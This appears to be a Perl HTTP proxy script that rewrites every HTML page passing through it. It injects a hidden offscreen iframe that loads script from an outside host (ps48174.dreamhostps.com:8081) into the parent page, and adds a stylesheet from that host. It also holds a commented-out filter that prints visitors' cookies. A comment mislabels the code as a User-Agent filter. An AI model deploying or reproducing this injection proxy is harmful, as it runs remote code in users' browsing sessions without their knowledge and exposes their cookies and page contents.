#!/usr/local/bin/perl

use HTTP::Proxy qw(:log);
use HTTP::Proxy::BodyFilter::simple;
use HTTP::Proxy::BodyFilter::complete;
use HTTP::Proxy::HeaderFilter::simple;
use Data::Dumper;

           # a simple User-Agent filter
my $INSERT = <<END;
<script>
(function(d) {
    var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document;
        iframe.src = 'about:blank';
        iframe.style.cssText = "position:absolute;width:1px;height:1px;left:-9999px;";
    doc.open().write('<body onload="YUI_config={win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://ps48174.dreamhostps.com:8081/together\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
    doc.close();
})(document);
</script>
END

my $hostname = 'ps48174.dreamhostps.com:8081';
my $css = '<link rel="stylesheet" href="http://' . $hostname . '/footer.css" type="text/css" />';

# init
my $proxy = HTTP::Proxy->new( port => 8080, host => '', max_clients => 100 );
$proxy->push_filter(
    mime     => 'text/html',
    response => HTTP::Proxy::BodyFilter::simple->new(
        sub {
#            my ( $self, $dataref, $message, $protocol, $buffer ) = @_;
#            ${ $_[1] } =~ s!<head(.*?)>!<head$1>$css!i;
            ${ $_[1] } =~ s!</body>!$INSERT</body>!i; 
            ${ $_[1] } =~ s!</head>!$css</head>!i; 
        }
    )
);

my $filter = HTTP::Proxy::HeaderFilter::simple->new(
    sub { 
            print Dumper($_[1]);

        if ($_[1]->header('host') eq $hostname) {
            print "Request for me!\n";
            print Dumper($_[1]->header('cookie'));
        }
    }
);
#$proxy->push_filter( request => $filter );

print "Ready to rumble on " . $proxy->host . ':' . $proxy->port . "\n";
$proxy->start;
